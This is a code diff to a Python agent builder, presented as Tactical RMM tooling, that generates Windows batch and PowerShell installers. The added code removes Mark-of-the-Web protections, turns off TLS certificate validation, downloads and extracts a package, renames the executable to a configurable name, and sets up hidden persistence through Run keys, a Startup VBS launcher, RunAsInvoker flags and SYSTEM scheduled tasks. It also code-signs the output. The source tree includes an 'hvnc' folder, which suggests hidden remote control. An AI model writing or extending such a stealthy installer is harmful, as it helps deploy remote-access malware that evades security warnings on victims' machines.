@@ -215,6 +215,11 @@ class AgentGenerator:
         # 1. Copy compiled standalone binary if present
         if os.path.isdir(DIST_AGENT_DIR) and os.path.isfile(os.path.join(DIST_AGENT_DIR, "TRMM_Agent.exe")):
             shutil.copytree(DIST_AGENT_DIR, build_dir, dirs_exist_ok=True)
+            try:
+                from .code_signer import CodeSigner
+                CodeSigner.sign_windows_executable(os.path.join(build_dir, "TRMM_Agent.exe"), app_title)
+            except Exception as e:
+                logger.debug(f"CodeSigner check on build_dir agent: {e}")
 
         # 2. Always sync latest live source files so new installations and OTA serve 100% identical codebase
         hvnc_src = os.path.join(ROOT_DIR, "hvnc")
@@ -283,6 +288,9 @@ echo [*] Installing to %INSTALL_DIR%...
 mkdir "%INSTALL_DIR%" 2>nul
 xcopy /E /Y /I "%~dp0*" "%INSTALL_DIR%\\" >nul
 
+echo [*] Removing Mark-of-the-Web zone identifiers...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Test-Path '%INSTALL_DIR%') {{ Get-ChildItem -Path '%INSTALL_DIR%' -Recurse | Unblock-File }}" >nul 2>&1
+
 if exist "%INSTALL_DIR%\\TRMM_Agent.exe" if not exist "%INSTALL_DIR%\\{app_name}.exe" (
     ren "%INSTALL_DIR%\\TRMM_Agent.exe" "{app_name}.exe"
 )
@@ -294,7 +302,7 @@ if not exist "%INSTALL_DIR%\\{app_name}.exe" (
 )
 
 {"" if not auto_start else f'''echo [*] Configuring silent auto-start persistence...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%INSTALL_DIR%\\{app_name}.exe'" >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Test-Path '%INSTALL_DIR%\\{app_name}.exe') {{ Unblock-File -Path '%INSTALL_DIR%\\{app_name}.exe' }}" >nul 2>&1
 reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
 reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /t REG_SZ /d "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /f >nul 2>&1
 powershell -NoProfile -ExecutionPolicy Bypass -Command "$vbs = [Environment]::GetFolderPath('Startup') + '\\{app_name}.vbs'; $c = @('Set ws = CreateObject(\"WScript.Shell\")', 'ws.Environment(\"Process\")(\"__COMPAT_LAYER\") = \"RunAsInvoker\"', 'ws.Run \"\"\"%INSTALL_DIR%\\{app_name}.exe\"\"\", 0, False'); [IO.File]::WriteAllLines($vbs, $c); Unblock-File -Path $vbs" >nul 2>&1
@@ -443,8 +451,11 @@ if not exist "%TEMP_ZIP%" (
 
 echo [*] Extracting package to %INSTALL_DIR%...
 mkdir "%INSTALL_DIR%" 2>nul
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference = 'SilentlyContinue'; Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference = 'SilentlyContinue'; Unblock-File -Path '%TEMP_ZIP%' -ErrorAction SilentlyContinue; Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force; if (Test-Path '%INSTALL_DIR%') {{ Get-ChildItem -Path '%INSTALL_DIR%' -Recurse | Unblock-File }}"
 del /f /q "%TEMP_ZIP%" 2>nul
+
+echo [*] Removing security zone identifiers...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Test-Path '%INSTALL_DIR%') {{ Get-ChildItem -Path '%INSTALL_DIR%' -Recurse | Unblock-File }}" >nul 2>&1
 
 if exist "%INSTALL_DIR%\\TRMM_Agent.exe" if not exist "%INSTALL_DIR%\\{app_name}.exe" (
     ren "%INSTALL_DIR%\\TRMM_Agent.exe" "{app_name}.exe"
@@ -457,7 +468,7 @@ if not exist "%INSTALL_DIR%\\{app_name}.exe" (
 )
 
 {"" if not auto_start else f'''echo [*] Configuring silent auto-start persistence...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%INSTALL_DIR%\\{app_name}.exe'" >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Test-Path '%INSTALL_DIR%\\{app_name}.exe') {{ Unblock-File -Path '%INSTALL_DIR%\\{app_name}.exe' }}" >nul 2>&1
 reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
 reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /t REG_SZ /d "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /f >nul 2>&1
 powershell -NoProfile -ExecutionPolicy Bypass -Command "$vbs = [Environment]::GetFolderPath('Startup') + '\\{app_name}.vbs'; $c = @('Set ws = CreateObject(\"WScript.Shell\")', 'ws.Environment(\"Process\")(\"__COMPAT_LAYER\") = \"RunAsInvoker\"', 'ws.Run \"\"\"%INSTALL_DIR%\\{app_name}.exe\"\"\", 0, False'); [IO.File]::WriteAllLines($vbs, $c); Unblock-File -Path $vbs" >nul 2>&1
@@ -503,6 +514,121 @@ timeout /t 3 /nobreak >nul 2>&1
             bootstrap_vbs_path = None
             vbs_filename = None
 
+        # 8b. Create Signed PowerShell Bootstrap Installer (.ps1)
+        ps1_filename = f"install_{app_name}.ps1"
+        bootstrap_ps1_path = os.path.join(OUTPUT_DIR, ps1_filename)
+        try:
+            ps1_script = f"""# Tactical RMM — Enterprise PowerShell Agent Installer
+# Endpoint Tag: {endpoint_tag} | Agent ID: {agent_id}
+[CmdletBinding()]
+param()
+
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+
+Write-Host "[*] Terminating previous {app_title} processes..." -ForegroundColor Cyan
+Stop-Process -Name "{app_name}" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "TRMM_Agent" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
+
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if ($isAdmin) {{
+    $installDir = Join-Path $env:ProgramFiles "{app_name}_{agent_id}"
+}} else {{
+    $installDir = Join-Path $env:LOCALAPPDATA "{app_name}_{agent_id}"
+}}
+
+Write-Host "[*] Installing to: $installDir" -ForegroundColor Cyan
+New-Item -ItemType Directory -Path $installDir -Force | Out-Null
+
+$tempZip = Join-Path $env:TEMP "{app_name.lower()}_{agent_id}.zip"
+if (Test-Path $tempZip) {{ Remove-Item $tempZip -Force -ErrorAction SilentlyContinue }}
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
+
+$urls = @({zip_urls_ps})
+Write-Host "[*] Downloading package..." -ForegroundColor Cyan
+foreach ($u in $urls) {{
+    try {{
+        $req = [System.Net.HttpWebRequest]::Create($u)
+        $req.Timeout = 10000
+        $req.ReadWriteTimeout = 60000
+        $res = $req.GetResponse()
+        $s = $res.GetResponseStream()
+        $fs = [System.IO.File]::Create($tempZip)
+        $s.CopyTo($fs)
+        $fs.Close(); $s.Close(); $res.Close()
+        if ((Test-Path $tempZip) -and (Get-Item $tempZip).Length -gt 1000) {{ break }}
+    }} catch {{}}
+}}
+
+if (-not (Test-Path $tempZip)) {{
+    Write-Host "[!] Failed to download agent package." -ForegroundColor Red
+    exit 1
+}}
+
+Write-Host "[*] Extracting package..." -ForegroundColor Cyan
+Unblock-File -Path $tempZip -ErrorAction SilentlyContinue
+Expand-Archive -Path $tempZip -DestinationPath $installDir -Force
+Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+
+$rawExe = Join-Path $installDir "TRMM_Agent.exe"
+$targetExe = Join-Path $installDir "{app_name}.exe"
+if ((Test-Path $rawExe) -and (-not (Test-Path $targetExe))) {{
+    Rename-Item -Path $rawExe -NewName "{app_name}.exe" -Force
+}}
+
+# Strip Mark-of-the-Web zone identifiers recursively
+Get-ChildItem -Path $installDir -Recurse | Unblock-File -ErrorAction SilentlyContinue
+
+if (-not (Test-Path $targetExe)) {{
+    Write-Host "[!] Error: {app_name}.exe missing." -ForegroundColor Red
+    exit 1
+}}
+
+{"" if not auto_start else f'''Write-Host "[*] Configuring auto-start persistence..." -ForegroundColor Cyan
+Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" -Name $targetExe -Value "~ RUNASINVOKER" -ErrorAction SilentlyContinue
+Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{app_name}" -Value "`"$targetExe`"" -ErrorAction SilentlyContinue
+
+$startupVbs = Join-Path ([Environment]::GetFolderPath('Startup')) "{app_name}.vbs"
+$vbsContent = @(
+    'Set ws = CreateObject("WScript.Shell")',
+    'ws.Environment("Process")("__COMPAT_LAYER") = "RunAsInvoker"',
+    'ws.Run """' + $targetExe + '""", 0, False'
+)
+[System.IO.File]::WriteAllLines($startupVbs, $vbsContent)
+Unblock-File -Path $startupVbs -ErrorAction SilentlyContinue
+
+if ($isAdmin) {{
+    schtasks /Create /TN "{app_name}_Persist" /TR "`"$targetExe`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /DELAY 0000:10 /F | Out-Null
+    schtasks /Create /TN "{app_name}_User" /TR "`"$targetExe`"" /SC ONLOGON /RL HIGHEST /F | Out-Null
+}}
+'''}
+
+Write-Host "[+] Launching {app_title} background service..." -ForegroundColor Green
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = $targetExe
+$psi.WorkingDirectory = $installDir
+$psi.UseShellExecute = $true
+$psi.EnvironmentVariables["__COMPAT_LAYER"] = "RunAsInvoker"
+[System.Diagnostics.Process]::Start($psi) | Out-Null
+
+Write-Host "[OK] {app_title} is active!" -ForegroundColor Green
+"""
+            with open(bootstrap_ps1_path, "w", encoding="utf-8") as psf:
+                psf.write(ps1_script)
+            try:
+                from .code_signer import CodeSigner
+                CodeSigner.sign_powershell_script(bootstrap_ps1_path)
+            except Exception as e:
+                logger.debug(f"PowerShell signing check: {e}")
+            logger.info(f"Generated signed PS1 bootstrap installer: {bootstrap_ps1_path}")
+        except Exception as e:
+            logger.warning(f"Failed to generate PS1 bootstrap installer: {e}")
+            bootstrap_ps1_path = None
+            ps1_filename = None
+
         logger.info(f"Generated standalone installer: {setup_exe_path}")
         logger.info(f"Generated agent zip: {zip_path}")
 
@@ -545,6 +671,9 @@ timeout /t 3 /nobreak >nul 2>&1
             "vbs_path": bootstrap_vbs_path,
             "vbs_filename": vbs_filename,
             "vbs_download_url": f"/api/agents/bootstrap/{vbs_filename}" if vbs_filename else None,
+            "ps1_path": bootstrap_ps1_path,
+            "ps1_filename": ps1_filename,
+            "ps1_download_url": f"/api/agents/bootstrap/{ps1_filename}" if ps1_filename else None,
             "one_liner": one_liner,
         }
 
